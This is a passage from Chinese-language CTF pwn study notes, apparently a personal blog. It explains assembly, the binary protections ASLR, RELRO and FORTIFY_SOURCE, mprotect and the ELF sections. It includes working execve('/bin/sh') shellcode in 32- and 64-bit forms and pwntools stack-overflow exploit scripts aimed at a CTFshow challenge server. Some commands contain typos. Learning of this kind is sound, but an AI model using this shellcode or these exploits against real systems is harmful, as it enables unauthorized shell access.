.data</span><br><span class="line">    msg db &quot;Welcome_to_CTFshow_PWN&quot;, 0</span><br><span class="line"></span><br><span class="line">section .text</span><br><span class="line">    global _start</span><br><span class="line"></span><br><span class="line">_start:</span><br><span class="line"></span><br><span class="line">; 立即寻址方式</span><br><span class="line">    mov eax, 11         ; 将11赋值给eax</span><br><span class="line">    add eax, 114504     ; eax加上114504</span><br><span class="line">    sub eax, 1          ; eax减去1</span><br><span class="line"></span><br><span class="line">; 寄存器寻址方式</span><br><span class="line">    mov ebx, 0x36d      ; 将0x36d赋值给ebx</span><br><span class="line">    mov edx, ebx        ; 将ebx的值赋值给edx</span><br><span class="line"></span><br><span class="line">; 直接寻址方式</span><br><span class="line">    mov ecx, [msg]      ; 将msg的地址赋值给ecx</span><br><span class="line"></span><br><span class="line">; 寄存器间接寻址方式</span><br><span class="line">    mov esi, msg        ; 将msg的地址赋值给esi</span><br><span class="line">    mov eax, [esi]      ; 将esi所指向的地址的值赋值给eax</span><br><span class="line"></span><br><span class="line">; 寄存器相对寻址方式</span><br><span class="line">    mov ecx, msg        ; 将msg的地址赋值给ecx</span><br><span class="line">    add ecx, 4          ; 将ecx加上4</span><br><span class="line">    mov eax, [ecx]      ; 将ecx所指向的地址的值赋值给eax</span><br><span class="line"></span><br><span class="line">; 基址变址寻址方式</span><br><span class="line">    mov ecx, msg        ; 将msg的地址赋值给ecx</span><br><span class="line">    mov edx, 2          ; 将2赋值给edx</span><br><span class="line">    mov eax, [ecx + edx*2]  ; 将ecx+edx*2所指向的地址的值赋值给eax</span><br><span class="line"></span><br><span class="line">; 相对基址变址寻址方式</span><br><span class="line">    mov ecx, msg        ; 将msg的地址赋值给ecx</span><br><span class="line">    mov edx, 1          ; 将1赋值给edx</span><br><span class="line">    add ecx, 8          ; 将ecx加上8</span><br><span class="line">    mov eax, [ecx + edx*2 - 6]  ; 将ecx+edx*2-6所指向的地址的值赋值给eax</span><br><span class="line"></span><br><span class="line">; 输出字符串</span><br><span class="line">    mov eax, 4          ; 系统调用号4代表输出字符串</span><br><span class="line">    mov ebx, 1          ; 文件描述符1代表标准输出</span><br><span class="line">    mov ecx, msg        ; 要输出的字符串的地址</span><br><span class="line">    mov edx, 22         ; 要输出的字符串的长度</span><br><span class="line">    int 0x80            ; 调用系统调用</span><br><span class="line"></span><br><span class="line">; 退出程序</span><br><span class="line">    mov eax, 1          ; 系统调用号1代表退出程序</span><br><span class="line">    xor ebx, ebx        ; 返回值为0</span><br><span class="line">    int 0x80            ; 调用系统调用</span><br></pre></td></tr></table></figure><p>ELF文件编译</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nasm -f elf flag.asm -o flag.o<span class="regexp">//</span>生成flag.o文件</span><br><span class="line">ld -m elf_i386 -o flag flag.o<span class="regexp">//</span>使用ld命令将flag.o文件使用<span class="number">32</span>位x86架构链接为flag</span><br></pre></td></tr></table></figure><p>注意：编译和执行汇编代码可能依赖于所使用的操作系统和体系结构，上述步骤适用于使用 NASM 汇编器和 ld 链接器的 32 位 x86 系统。根据环境相应地调整编译和链接的命令。</p><p>.c文件编译</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc flag.<span class="keyword">c</span> -o flag</span><br></pre></td></tr></table></figure><p>含key文件编译</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo <span class="string">&quot;the_key&quot;</span>&gt;key<span class="regexp">//</span>生成写入内容的key文件</span><br><span class="line">gcc flag.c -o flag</span><br></pre></td></tr></table></figure><p>.s文件编译</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">gcc</span> flag.s -o flag</span><br></pre></td></tr></table></figure><p>.s 文件是汇编语言源文件的一种常见扩展名。它包含了使用汇编语言编写的程序代码。汇编语言 是一种低级编程语言，用于直接操作计算机的指令集架构。 .s 文件通常由汇编器（Assembler）处 理，将其转换为可执行文件或目标文件。</p><p>当使用分号（ ; ）将命令连接在一起时，它们按照从左到右的顺序逐个执行，无论前面的命令是否 成功。这意味着无论前一个命令是否成功执行，后续的命令都将被执行。</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">comma<span class="symbol">nd1</span> ; comma<span class="symbol">nd2</span> ; comma<span class="symbol">nd3</span></span><br></pre></td></tr></table></figure><p>在这个例子中， command1 执行完毕后，无论成功与否，接着会执行 command2 ，然后再执行 command3 。这样，多个命令可以按顺序在一行上执行。 或者也可以使用 &amp; 将两条命令拼接在一起可以实现并行执行，即这两条命令将同时在后台执行。命 令之间使用 &amp; 进行分隔,这种方式下命令的输出可能会相互混合，具体的输出顺序取决于命令的执行速度和系统资源。</p><p><strong>真真假假，真亦真，假亦假</strong></p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">system(<span class="string">&quot;echo &#x27;flag is here&#x27;&gt;&gt;/ctfshow_flag&quot;</span>)<span class="comment">;</span></span><br></pre></td></tr></table></figure><p>这个命令将字符串 ‘flag is here’ 追加写入 &#x2F;ctfshow_flag 文件中。 <strong>&gt;&gt; 符号表示以追加的方式写入文件，如果文件不存在则创建新文件。</strong>如果 &#x2F;ctfshow_flag 文件已经存在，那 么该命令会在文件的末尾添加 ‘flag is here’ 。</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">system(<span class="string">&quot;echo &#x27;flag is here&#x27;&gt;/ctfshow_flag&quot;</span>)<span class="comment">;</span></span><br></pre></td></tr></table></figure><p> 这个命令将字符串 ‘flag is here’ 覆盖写入 &#x2F;ctfshow_flag 文件中。 <strong>&gt; 符号表示以覆盖 的方式写入文件，如果文件不存在则创建新文件。</strong>如果 &#x2F;ctfshow_flag 文件已经存在，那么 该命令会将文件中原有的内容替换为 ‘flag is here’ 。 这两个命令都用于将 ‘flag is here’ 写入 &#x2F;ctfshow_flag 文件中，不同之处在于写入方式的不 同。第一个命令使用追加方式，在文件末尾添加内容；第二个命令使用覆盖方式，将文件内容替换为新 内容。具体使用哪个命令取决于需求和文件操作的预期结果。</p><p>使用了 exec 函数来执行 sh 命令，并使用 1&gt;&amp;0 来进行输出重定向。这个命令将标准输出重定向到标准输入，实际上就是将命令的输出发送到后续命令的输入。 具体来说， 1&gt;&amp;0 中的 1 表示标准输出， 0 表示标准输入。通过将标准输出重定向到标准输入，可 以实现将命令的输出作为后续命令的输入。这样可以在执行 sh 命令后，进入一个交互式的Shell环境， 可以在该环境中执行命令并与用户进行交互。</p><p><strong>RELRO介绍</strong></p><p>RELRO（RELocation Read-Only）是一种可选的二进制保护机制，用于增加程序的安全性。它主要 通过限制和保护全局偏移表（Global Offset Table，简称 GOT）和过程链接表（Procedure Linkage Table，简称 PLT）的可写性来防止针对这些结构的攻击。 </p><p>RELRO保护有三种状态： </p><ol><li><p>No RELRO：在这种状态下，<strong>GOT和PLT都是可写</strong>的，意味着攻击者可以修改这些表中的指 针，从而进行攻击。这是最弱的保护状态。</p></li><li><p>Partial RELRO：在这种状态下，<strong>GOT的开头部分</strong>被设置为<strong>只读</strong>（RO），而<strong>剩余部分仍然可写</strong>。这样可以防止一些简单的攻击，但仍存在一些漏洞。</p></li><li><p>Full RELRO：在这种状态下，<strong>GOT和PLT都被设置为只读</strong>（RO）。这样做可以防止对这些结构的修改，提供更强的保护。任何对这些表的修改都会导致程序异常终止。</p></li></ol><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">readfile -S pwn<span class="regexp">//</span>查表项地址</span><br></pre></td></tr></table></figure><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">objdump -R pwn<span class="regexp">//</span>查看目标文件的动态链接命令</span><br></pre></td></tr></table></figure><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">readelf -l pwn<span class="regexp">//</span>查看可执行文件或共享库的ELF头和程序头表信息</span><br></pre></td></tr></table></figure><p><strong>保护卡</strong></p><p>ASLR（Address Space Layout Randomization）是一种操作系统级别的安全保护机制，旨在增加 软件系统的安全性。它通过随机化程序在内存中的布局，使得攻击者难以准确地确定关键代码和数据的 位置，从而增加了利用软件漏洞进行攻击的难度。 </p><p>开启不同等级会有不同的效果： </p><ol><li><strong>内存布局随机化</strong>： ASLR的主要目标是随机化程序的内存布局。在传统的内存布局中，不同的 库和模块通常会在固定的内存位置上加载，攻击者可以利用这种可预测性来定位和利用漏洞。 ASLR通过随机化这些模块的加载地址，使得攻击者无法准确地确定内存中的关键数据结构和 代码的位置。 </li><li><strong>地址空间范围的随机化</strong>： ASLR还会随机化进程的地址空间范围。在传统的地址空间中，栈、 堆、代码段和数据段通常会被分配到固定的地址范围中。ASLR会随机选择地址空间的起始位 置和大小，从而使得这些重要的内存区域在每次运行时都有不同的位置。</li><li><strong>随机偏移量</strong>： ASLR会引入随机偏移量，将程序和模块在内存中的相对位置随机化。这意味着 每个模块的实际地址是相对于一个随机基址偏移的，而不是绝对地址。攻击者需要在运行时发 现这些偏移量，才能准确地定位和利用漏洞。</li><li><strong>堆和栈随机化</strong>： ASLR也会对堆和栈进行随机化。堆随机化会在每次分配内存时选择不同的起 始地址，使得攻击者无法准确地预测堆上对象的位置。栈随机化会随机选择栈帧的起始位置， 使得攻击者无法轻易地覆盖返回地址或控制程序流程。 ALSR全局配置&#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;randomize_va_space有三种情况： 0表示关闭ALSR 1表示部分开启（将mmap的基址、stack和vdso页面随机化） 2表示完全开启</li></ol><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230706231549588.png" alt="image-20230706231549588"></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat  <span class="regexp">/poc/</span>sys<span class="regexp">/kernel/</span>randomize_va_space<span class="regexp">//</span>查看alsr</span><br></pre></td></tr></table></figure><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="regexp">//</span>sudo su进入root模式后 <span class="regexp">//</span>ehco <span class="number">0</span> &gt; <span class="regexp">/poc/</span>sys<span class="regexp">/kernel/</span>randomize_va_space<span class="regexp">//</span>关闭alsr</span><br></pre></td></tr></table></figure><p>FORTIFY_SOURCE</p><p>FORTIFY_SOURCE 是一个 C&#x2F;C++ 编译器提供的安全保护机制，旨在防止缓冲区溢出和其他与字符 串和内存操作相关的安全漏洞。它是在编译时自动插入的一组额外代码，用于增强程序对于缓冲区溢出 和其他常见安全问题的防护。</p><p> FORTIFY_SOURCE 提供了以下主要功能：</p><ol><li><strong>运行时长度检查</strong>：FORTIFY_SOURCE 会在编译时自动将长度检查代码插入到一些危险的库函数中，例如 strcpy 、 strcat 、 sprintf 等。这些代码会检查目标缓冲区的长度，以确保操作不会导致溢出。如果检测到溢出情况，程序会立即终止，从而防止潜在的漏洞利用。</li><li><strong>缓冲区溢出检测</strong>：FORTIFY_SOURCE 还会将额外的保护机制添加到一些敏感的库函数中，例如 memcpy 、 memmove 、 memset 等。这些机制可以检测传递给这些函数的源和目标缓冲区是否有重叠，并防止潜在的缓冲区溢出。 </li><li><strong>安全警告和错误报告</strong>：当 FORTIFY_SOURCE 检测到潜在的缓冲区溢出或其他安全问题时，它会生成相应的警告和错误报告。 FORTIFY_SOURCE 提供了一层额外的安全保护，它可以在很大程度上减少常见的缓冲区溢出和字符串操作相关的安全漏洞。</li></ol><p>signal(11, (__sighandler_t)sigsegv_handler);函数当发生 对存储的无效访问时,会把stderr打印输出,即将flag的值打印输出</p><p><strong>mprotect函数</strong>（静态编译时可搜索【函数很多】）</p><figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">file</span> --（<span class="keyword">filename</span>） checksec --（<span class="keyword">filename</span>）</span><br></pre></td></tr></table></figure><p>作用：修改内存的权限为可读可写可执行</p><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230713170259726.png" alt="image-20230713170259726"></p><p>prot可以取以下几个值，并且可以用“|”将几个属性合起来使用： </p><p>1）PROT_READ：表示内存段内的内容可读；<br> 2）PROT_WRITE：表示内存段内的内容可些；<br> 3）PROT_EXEC：表示内存段中的内容可执行；<br> 4）PROT_NONE：表示内存段中的内容根本没法访问。<br> 5） prot&#x3D;7 是可读可写可执行 指定的内存区间必须包含整个内存页（4K）。</p><p>区间开始的地址start必须是一个内存页的起始地址， 并且区间长度len必须是页大小的整数倍。对于静态程序本身，地址是不会变的。 指定的内存区间必须包含整个内存页（4K）。区间开始的地址start必须是一个内存页的起始地址， 并且区间长度len必须是页大小的整数倍。因为程序本身也是静态编译，所以地址是不会变的。</p><p><strong>起始地址判断方法</strong> ：①测试地址&amp;0xfff结果为0 ②%4096结果为0（一页为4k&#x3D;4096）</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230726151609037.png" alt="image-20230726151609037"></p><p>找到溢出点 程序无后门则自动生成shellcode（条件允许可ret2libc）利用mprotect函数+gadgets攻击（注意参数暂时小家【一次ret最好】）通过read函数将shellcode读入程序段 </p><p>read函数原型: </p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">ssize_t</span> <span class="title">read</span><span class="params">(<span class="type">int</span> fd, <span class="type">void</span> *buf, <span class="type">size_t</span> count)</span></span>;</span><br></pre></td></tr></table></figure><p>fd 设为0时就可以从输入端读取内容 设为0<br>buf 设为我们想要执行的内存地址<br>设为我们已找到的内存地址size 适当大小就可以 只要够读入shellcode就可以，设置大点无所谓</p><p><strong>.plt节</strong><br>plt(Procedure Linkage Table)，.plt节包含了从动态链接器调用调用从共享库中导入函数所必需的代码,该节中包含代码，节类型被标记为SHT_PROGBITS<br><strong>.got.plt</strong><br>也就是我们所说的got表，.got.plt节保留了全局偏移表。.got和.plt起提供了对导入共享库函数的访问入口,由动态链接器在运行时进行修改。如果攻击者获取到了堆或.bss漏洞的一个指针大小的写原语<br>就可以对该节进行任意修改.got.plt跟程序执行有关，该节类型被标记位SHT_PROGBITS<br><strong>.rel.</strong>*<br>.rel.”是一种通用的命名模式,用于表标与重定位(relocation)相关的节 (section)名称。在编译器和链接器中,重定位是将目标文件中的符号引用与符号定义关联起来的过程。<br>在可执行文件或共享库中，有许多不同的节（例如代码节、数据节、符号表节等).rel.节通常用于存储重定位表(relocation table) ,其中包含了需要进行重定位的符号引用和相应的重定位类型。<br>重定位表记录了加载和链接过程中需要修复的位置，以便正确解析符号引用,通过读取重定位表,系统或链接器可以根据符号的定义位置来计算并更新符号引I用的实队示地i1<br>.re1.*节的具体命名方式可能因不同的工具链和目标文件格式而有所不同,例如，在ELF格式的目标文件中，.rel.text表示与代码节(.text)相关的固定位表。<br>常见的.rel.节包括:<br>.rel.text :与代码节相关的重定位表.<br>.rel.data:与数据节相关的重定位表<br>·.rel.bss:与未初始化数据节(8SS)相关的重定位表<br>.rel.rodata ;与只读数据节相关的重定位表<br><strong>.strtab节</strong><br>字符串表，其包括.symtabl和.debug节区中的符号表以及节头部的节名称。表中的内容会被.symtab的EIN_Sym(Eilf32_ SymRElf64_Sym)结构中的st_name条目引用<br>objdump -R 是一个用于查看目标文件或可执行文件中重定位表 (relocation table)的命令。该命令会显示出目标文件中涉及到的外部符号的重定位信息<br>重定位表记录了需要在船接或加载过程中修复的位置，以便正确解析外部符号的地址。通过查看重定位表，可以了解到程序中哪些位置需要进行重定位以及涉及的外部<br>readelfS 是一个用于直看目标文件或可执行文件中节(section)信息的命令。它可以显示出目标文件的名个节的详细信息，包括名称大小、偏移量、链接属性等。</p><p><strong>puts遇到’\x00’才停止</strong><br>可辅助打印出函数变量相邻关键信息.（例 没读入puts函数最后一个值导致程序在puts时连带下方紧联系的关键值【用户登录密码】）</p><p><strong>32位shellcode</strong></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230805225412511.png" alt="image-20230805225412511"></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230805231715929.png" alt="image-20230805231715929"></p><p>Linux执行execve（“&#x2F;bin&#x2F;sh”,NULL,NULL）</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">push</span> <span class="number">0</span>x68</span><br></pre></td></tr></table></figure><p>将0x68（104）压入栈中，这是为了将后续的字符串”&#x2F;bin&#x2F;sh”放入栈中，以便后续调用.</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">push</span> <span class="number">0x732f2f2f</span></span><br></pre></td></tr></table></figure><p>由于x86栈存储为小端序，此步是为了将”&#x2F;bin&#x2F;sh”的前半部分字符逆序压入栈中即”sh&#x2F;&#x2F;“</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">push</span> <span class="number">0x6e69622f</span></span><br></pre></td></tr></table></figure><p>接下来就是后半部分喽（”&#x2F;bin”）</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">mov</span> <span class="built_in">ebx</span>，<span class="built_in">esp</span></span><br></pre></td></tr></table></figure><p>将”&#x2F;bin&#x2F;sh”起始地址复制给ebx.ebx将作为execve调用的第一个参数，即要执行的可执行文件的路径.</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">xor</span> <span class="built_in">ecx</span>，<span class="built_in">ecx</span></span><br><span class="line"><span class="keyword">xor</span> <span class="built_in">edx</span>，<span class="built_in">edx</span></span><br></pre></td></tr></table></figure><p>^操作将ecx和ebx置为0，目的就是将此俩寄存器作为调用的第二个和第三个参数，即命令行参数和环境变量.（0-&gt;NULL 无此两变量）</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">push</span> <span class="number">0xB</span></span><br><span class="line"><span class="keyword">pop</span> <span class="built_in">ebx</span></span><br></pre></td></tr></table></figure><p>将值11（0xb）压入栈中，弹到eax寄存器中，作为系统调用号（这么方便当然不止这一种喽😀）</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">int</span> <span class="number">0x80</span></span><br></pre></td></tr></table></figure><p>触发中断（前面的种种埋伏（eax，ebx, ecx, edx）就是为了满足系统调用 启动一个新shell）</p><p><strong>64位shellcoede</strong></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230805231443170.png" alt="image-20230805231443170"></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230805231656076.png" alt="image-20230805231656076"></p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">push</span> <span class="built_in">rax</span></span><br></pre></td></tr></table></figure><p>压入rax值 保留 为后续使用</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">xor</span> <span class="built_in">rdx</span>，<span class="built_in">rdx</span></span><br><span class="line"><span class="keyword">xor</span> <span class="built_in">rsi</span>，<span class="built_in">rsi</span></span><br></pre></td></tr></table></figure><p>将两寄存器置0，作为execve第二个和第三个参数（满足64位调用规则）</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">mov</span> rbx，<span class="string">&#x27;/bin/sh&#x27;</span></span><br></pre></td></tr></table></figure><p>将’bin&#x2F;sh’赋值给rbx</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">push</span> <span class="built_in">rbx</span>#<span class="string">&quot;/bin/sh&quot;</span>的地址</span><br></pre></td></tr></table></figure><p>给execve（）传调用的第一个参数传递可执行文件路径（“&#x2F;bin&#x2F;sh”）</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">push</span> <span class="built_in">rsp</span></span><br><span class="line"><span class="keyword">pop</span> <span class="built_in">rdi</span></span><br></pre></td></tr></table></figure><p>将”&#x2F;bin&#x2F;sh”的地址弹到rdi寄存器 方便execve（）调用</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">mov</span> <span class="built_in">al</span>，<span class="number">59</span></span><br></pre></td></tr></table></figure><p>设置系统调用号</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">syscall</span></span><br></pre></td></tr></table></figure><p>触发系统调用</p><p><strong>注意</strong> 寄存器值的设置 x86（eax，ebx，ecx，edx）  x64（rax，rdi，rsi，rdx）</p><p><strong>小坑记录</strong></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230806182846402.png" alt="image-20230806182846402"></p><p>​                  开PIE 地址随机</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230806183003512.png" alt="image-20230806183003512"></p><p>NX没打开查看也没有后门 初想法是直接利用gets然后返回到v4（利用pwntolls生成的shellcoede传入v4地址） </p><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">&#x27;amd64&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#p = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>,<span class="number">28195</span>)</span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">got = p.recvuntil(<span class="string">&#x27;[&#x27;</span>)</span><br><span class="line">got = p.recvuntil(<span class="string">&#x27;]&#x27;</span>,drop = <span class="literal">True</span>)</span><br><span class="line">got = <span class="built_in">int</span>(got,<span class="number">16</span>)</span><br><span class="line">payload = cyclic(<span class="number">0x10</span>+<span class="number">8</span>) + p64(got) + shellcode</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>写的时候忘记recvuntil（’]’,drop &#x3D; True）略略略w</p><p>发现EOF 感觉思路没问题 查看汇编和动调</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230806183655150.png" alt="image-20230806183655150"></p><p>gets（v4）后有leave retn指令–&gt;相当于mov rbp,rsp  pop rbp retn 占用了24个字节 因此我们不能使用v4后面的24bytes</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230806184829072.png" alt="image-20230806184829072"></p><p>生成的shellcode对rsp进行了其他操作所以v4后的8bytes也不能存放.</p><p>修正后的exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">&#x27;amd64&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>,<span class="number">28195</span>)</span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">got = p.recvuntil(<span class="string">&#x27;[&#x27;</span>)</span><br><span class="line">got = p.recvuntil(<span class="string">&#x27;]&#x27;</span>,drop = <span class="literal">True</span>)</span><br><span class="line">got = <span class="built_in">int</span>(got,<span class="number">16</span>)</span><br><span class="line">payload = cyclic(<span class="number">0x10</span>+<span class="number">8</span>) + p64(got + <span class="number">24</span> +<span class="number">8</span>) + shellcode</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><strong>获取shellcode的几种方法</strong></p><p><a href="https://www.freebuf.com/articles/system/237300.html">https://www.freebuf.com/articles/system/237300.html</a></p><p>使用read（）–&gt;限制shellcode长度 <strong>注意计算shellcode长度</strong></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230807113729341.png" alt="image-20230807113729341"></p><p>PIE打开 地址随机</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230807114028427.png" alt="image-20230807114028427"></p><p>read限制输入0x38（36）大小  buf可分配大小为0x10 在read处存在明显溢出 偏移为0x10+8（24） 因此shellcode大小必在24内（更短的也类似计算）<br>？ 遇到shellcode长度计算为23  buf_addr + 32大小开始注入<br>（整字节注入喽 小了不够 大了覆盖其他区域出错）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">global _start</span></span><br><span class="line"><span class="comment">section .text</span></span><br><span class="line"><span class="comment">_start:</span></span><br><span class="line"><span class="comment">push 59</span></span><br><span class="line"><span class="comment">pop rax</span></span><br><span class="line"><span class="comment">cdq</span></span><br><span class="line"><span class="comment">push rdx</span></span><br><span class="line"><span class="comment">mov rbx,0x68732f6e69622f2f</span></span><br><span class="line"><span class="comment">push rbx</span></span><br><span class="line"><span class="comment">push rsp</span></span><br><span class="line"><span class="comment">pop rdi</span></span><br><span class="line"><span class="comment">push rdx</span></span><br><span class="line"><span class="comment">push rdi</span></span><br><span class="line"><span class="comment">push rsp</span></span><br><span class="line"><span class="comment">pop rsi</span></span><br><span class="line"><span class="comment">syscall</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="type">char</span> code[] = <span class="string">&quot;\x6a\x3b\x58\x99\x52\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x53\x54\x5f\x52\x57\x54\x5e\x0f\x05&quot;</span>;</span><br><span class="line"><span class="comment">// char code[] = &quot;\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05&quot;;</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;len:%d bytes\n&quot;</span>, <span class="built_in">strlen</span>(code));</span><br><span class="line">    (*(<span class="type">void</span>(*)()) code)();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">           </span><br></pre></td></tr></table></figure><p> 有限shellcode 获取网站<a href="https://www.exploit-db.com/shellcodes/43550">https://www.exploit-db.com/shellcodes/43550</a></p><p><strong>有时开启某种保护不代表这条路不通</strong><br>                     <img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230807120842290.png" alt="image-20230807120842290">  </p><p>NX打开 真的不可自行写入吗？</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230807120907096.png" alt="image-20230807120907096"></p><p>无后门 但buf用mmap分配一块连续的内存空间（1024） 具有可读可写可执行权限（7） 可直接在这里传入shellcode拿到shell （buf用mmap映射了地址）</p><p>FULL RELRO<br>PIE enable</p><p>看汇编（好长一串啊 烦烦烦 静下心慢慢看噜 谁让我这么菜捏ww）<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230807141728617.png" alt="image-20230807141728617"></p><p>这就是主函数吗！<br>🏀筐 